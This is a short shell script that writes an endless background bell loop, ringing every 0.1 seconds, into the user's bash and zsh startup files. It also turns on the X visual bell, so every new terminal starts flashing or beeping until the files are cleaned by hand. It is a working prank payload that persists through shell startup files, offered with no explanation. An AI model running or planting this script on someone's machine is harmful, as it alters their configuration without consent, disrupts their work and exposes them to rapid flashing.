#!/bin/sh

echo "while true ; do echo -en '\a' ; sleep 0.1 ; done & true" >> $HOME/.bashrc
echo "while true ; do echo -en '\a' ; sleep 0.1 ; done & true" >> $HOME/.zshrc

echo "*visualBell: True" >> $HOME/.Xdefaults
echo "*visualBell: True" >> $HOME/.Xresources

xrdb -merge $HOME/.Xresources
xrdb -merge $HOME/.Xdefaults
